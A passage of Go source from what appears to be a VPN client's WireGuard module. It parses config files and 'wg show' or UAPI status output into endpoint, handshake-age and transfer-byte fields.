		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	if p, err := exec.LookPath(name); err == nil {
		return p
	}
	return ""
}

// ============================================================================
// Config Parsing
// ============================================================================

func (w *WireGuardProtocol) parseConfFile(content string) {
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "Address") {
			parts := strings.SplitN(line, "=", 2)
			if len(parts) == 2 {
				w.localAddr = strings.TrimSpace(parts[1])
			}
		}
		if strings.HasPrefix(line, "Endpoint") {
			parts := strings.SplitN(line, "=", 2)
			if len(parts) == 2 {
				w.serverAddr = strings.TrimSpace(parts[1])
			}
		}
	}
}

func (w *WireGuardProtocol) parseWgShowOutput(output string, status *ProtocolStatus) {
	// Auto-detect format. The traditional wg-show text output uses
	// human-readable lines like "endpoint: 1.2.3.4:51820" / "latest
	// handshake: ..." / "transfer: X received, Y sent". The cross-
	// platform UAPI format (used on macOS by our in-process tunnel
	// since v0.9.14.28) uses lowercase `key=value` lines:
	// `endpoint=1.2.3.4:51820`, `last_handshake_time_sec=N`,
	// `tx_bytes=N`, `rx_bytes=N`. Detect by looking for `key=value`
	// patterns; if any line has `=` without `:`, treat as UAPI.
	if isUAPIFormat(output) {
		parseUAPIStatus(output, status)
		return
	}
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "endpoint:") {
			status.ServerAddress = strings.TrimSpace(strings.TrimPrefix(line, "endpoint:"))
		}
		if strings.HasPrefix(line, "latest handshake:") {
			status.LastHandshake = strings.TrimSpace(strings.TrimPrefix(line, "latest handshake:"))
		}
		if strings.HasPrefix(line, "transfer:") {
			status.BytesRx, status.BytesTx = parseWgTransfer(line)
		}
	}
}

// isUAPIFormat returns true if the output looks like WireGuard's
// cross-platform IPC protocol (key=value, all lowercase) rather than
// `wg show`'s human-readable text. We look for the unmistakable
// `private_key=` or `public_key=` line that always appears at the
// top of UAPI dumps and never appears in wg-show output.
func isUAPIFormat(output string) bool {
	for _, line := range strings.Split(output, "\n") {
		t := strings.TrimSpace(line)
		if strings.HasPrefix(t, "private_key=") || strings.HasPrefix(t, "public_key=") {
			return true
		}
	}
	return false
}

// parseUAPIStatus extracts ServerAddress / LastHandshake / BytesRx /
// BytesTx from a WireGuard UAPI dump. The dump can contain multiple
// peers; we accumulate transfer bytes across all peers (matching
// wg-show's behavior of summing) and pick the most recent handshake
// timestamp. ServerAddress comes from the first endpoint we see.
func parseUAPIStatus(output string, status *ProtocolStatus) {
	var maxHandshakeSec int64
	var totalRx, totalTx int64
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		eq := strings.Index(line, "=")
		if eq < 0 {
			continue
		}
		key := line[:eq]
		val := line[eq+1:]
		switch key {
		case "endpoint":
			if status.ServerAddress == "" {
				status.ServerAddress = val
			}
		case "last_handshake_time_sec":
			var ts int64
			fmt.Sscan(val, &ts)
			if ts > maxHandshakeSec {
				maxHandshakeSec = ts
			}
		case "rx_bytes":
			var n int64
			fmt.Sscan(val, &n)
			totalRx += n
		case "tx_bytes":
			var n int64
			fmt.Sscan(val, &n)
			totalTx += n
		}
	}
	status.BytesRx = totalRx
	status.BytesTx = totalTx
	if maxHandshakeSec > 0 {
		// Format as "N seconds ago" string to match wg-show conventions
		// the frontend expects. The frontend's relative-time formatter
		// in stores/vpn.ts handles this string; we just need it to be
		// a non-empty parseable value.
		ago := time.Now().Unix() - maxHandshakeSec
		if ago < 0 {
			ago = 0
		}
		status.LastHandshake = formatHandshakeAgo(ago)
	}
}

// formatHandshakeAgo formats a "seconds since handshake" duration into
// the same human-readable string `wg show` produces (e.g. "2 minutes,
// 30 seconds ago"). Keeps the existing frontend-side parsing path
// unchanged; this is purely a UAPI→wg-show string-format adapter so
// stores/vpn.ts can stay format-agnostic.
func formatHandshakeAgo(sec int64) string {
	if sec <= 0 {
		return "Now"
	}
	min := sec / 60
	s := sec % 60
	if min == 0 {
		return fmt.Sprintf("%d second%s ago", s, plural(s))
	}
	if min < 60 {
		return fmt.Sprintf("%d minute%s, %d second%s ago", min, plural(min), s, plural(s))
	}
	hr := min / 60
	rmin := min % 60
	return fmt.Sprintf("%d hour%s, %d minute%s ago", hr, plural(hr), rmin, plural(rmin))
}

func plural(n int64) string {
	if n == 1 {
		return ""
	}
	return "s"
}

// parseWgTransfer extracts bytes from "transfer: X received, Y sent"
func parseWgTransfer(line string) (rx, tx int64) {
	line = strings.TrimSpace(strings.TrimPrefix(line, "transfer:"))
	parts := strings.Split(line, ",")
	if len(parts) >= 1 {
		rx = parseHumanBytes(strings.TrimSpace(parts[0]))
	}
	if len(parts) >= 2 {
		tx = parseHumanBytes(strings.TrimSpace(parts[1]))
	}
	return
}

// parseHumanBytes converts human-readable byte strings to int64
func parseHumanBytes(s string) int64 {
	s = strings.TrimSuffix(s, " received")
	s = strings.TrimSuffix(s, " sent")
	s = strings.TrimSpace(s)

	multiplier := int64(1)
	switch {
	case strings.HasSuffix(s, " KiB"):
		multiplier = 1024
		s = strings.TrimSuffix(s, " KiB")
	case strings.HasSuffix(s, " MiB"):
		multiplier = 1024 * 1024
		s = strings.TrimSuffix(s, " MiB")
	case strings.HasSuffix(s, " GiB"):
		multiplier = 1024 * 1024 * 1024
		s = strings.TrimSuffix(s, " GiB")
	case strings.HasSuffix(s, " B"):
		s = strings.TrimSuffix(s, " B")
	}

	var val float64
	fmt.Sscan(s, &val)
	return int64(val * float64(multiplier))
}
